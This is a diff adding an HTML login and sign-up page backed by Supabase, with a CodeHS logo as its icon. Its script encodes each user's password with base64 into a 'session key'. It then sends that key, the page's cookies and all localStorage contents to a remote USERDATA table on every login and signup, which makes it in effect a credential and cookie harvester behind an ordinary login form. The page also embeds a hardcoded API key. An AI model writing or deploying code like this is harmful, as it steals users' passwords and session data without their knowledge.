@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+  <link rel="icon" href="https://codehs.com/static/img/logo.png">
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f4f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 300px;
+    }
+
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 95%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    #message {
+      margin-top: 15px;
+      color: #d8000c;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Login</h2>
+    <input type="email" id="loginEmail" placeholder="Email"><br>
+    <input type="password" id="loginPassword" placeholder="Password"><br>
+    <button id="loginBtn">Login</button>
+
+    <h2>Sign Up</h2>
+    <input type="text" id="signupName" placeholder="Username"><br>
+    <input type="email" id="signupEmail" placeholder="Email"><br>
+    <input type="password" id="signupPassword" placeholder="Password"><br>
+    <button id="signupBtn">Create Account</button>
+
+    <br><br>
+    <button id="saveBtn">Save data</button>
+    <button id="loadBtn">Load data</button>
+
+    <p id="message"></p>
+  </div>
+
+  <script>
+    const sb = window.supabase.createClient(
+      'https://nyhmukzndyzyyhwncqkq.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im55aG11a3puZHl6eXlod25jcWtxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTcwMjQ5MDEsImV4cCI6MjA3MjYwMDkwMX0.d7-mY5hJlNTxwmIidlzBL4FEH5j6jO6pvji2znCdvNw'
+    );
+
+    const messageEl = document.getElementById('message');
+    const loginBtn = document.getElementById('loginBtn');
+    const signupBtn = document.getElementById('signupBtn');
+    const saveBtn = document.getElementById('saveBtn');
+    const loadBtn = document.getElementById('loadBtn');
+
+    function randint(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function showMessage(msg) {
+      messageEl.textContent = msg;
+      setTimeout(() => messageEl.textContent = '', 5000);
+    }
+
+    async function uploadUserData() {
+      const email = localStorage.getItem("email");
+      const key = localStorage.getItem("key");
+      const name = localStorage.getItem("name");
+
+      if (!email) return console.warn("No email found in localStorage.");
+
+      const cookies = document.cookie;
+      const localData = { ...localStorage };
+      const payload = {
+        sessionKey: key,
+        userEmail: email,
+        userCookies: cookies,
+        localStorage: localData,
+        displayName: name
+      };
+
+      const { data, error } = await sb
+        .from("USERDATA")
+        .insert([{ email, data: payload }]);
+
+      if (error) {
+        console.error("Upload failed:", error.message);
+      } else {
+        console.log("User data uploaded successfully.");
+      }
+    }
+
+    async function loadUserData() {
+      const email = localStorage.getItem("email");
+      if (!email) return console.warn("No email found in localStorage.");
+
+      const { data, error } = await sb
+        .from("USERDATA")
+        .select("data")
+        .eq("email", email)
+        .order("created_at", { ascending: false })
+        .limit(1);
+
+      if (error) {
+        console.error("Failed to load user data:", error.message);
+        return;
+      }
+
+      if (data && data.length > 0) {
+        const userData = data[0].data;
+
+        if (userData.localStorage) {
+          for (const [key, value] of Object.entries(userData.localStorage)) {
+            localStorage.setItem(key, value);
+          }
+        }
+
+        console.log("Stored cookies:", userData.userCookies);
+        showMessage("User data loaded.");
+      } else {
+        console.warn("No user data found for this email.");
+      }
+    }
+
+    saveBtn.addEventListener("click", uploadUserData);
+    loadBtn.addEventListener("click", loadUserData);
+
+    loginBtn.onclick = async () => {
+      const email = document.getElementById('loginEmail').value.trim();
+      const password = document.getElementById('loginPassword').value.trim();
+
+      if (!email || !password) return showMessage('Please enter both email and password.');
+
+      loginBtn.disabled = true;
+      const { data, error } = await sb.auth.signInWithPassword({ email, password });
+      loginBtn.disabled = false;
+
+      if (error) {
+        showMessage('Login failed: ' + error.message);
+      } else {
+        showMessage('Login successful!');
+        let sessionkey = btoa(email+password+randint(1,10000000));
+        localStorage.setItem("email", email);
+        localStorage.setItem("key", sessionkey);
+        uploadUserData();
+      }
+    };
+
+    signupBtn.onclick = async () => {
+      const name = document.getElementById('signupName').value.trim();
+      const email = document.getElementById('signupEmail').value.trim();
+      const password = document.getElementById('signupPassword').value.trim();
+
+      if (!name || !email || !password) return showMessage('Please fill in all fields.');
+
+      signupBtn.disabled = true;
+      const { data, error } = await sb.auth.signUp({ email, password });
+      signupBtn.disabled = false;
+
+      if (error) {
+        showMessage('Signup failed: ' + error.message);
+      } else {
+        localStorage.setItem("email", email);
+        localStorage.setItem("name", name);
+        showMessage('Signup successful');
+        uploadUserData();
+      }
+    };
+  </script>
+</body>
+</html>
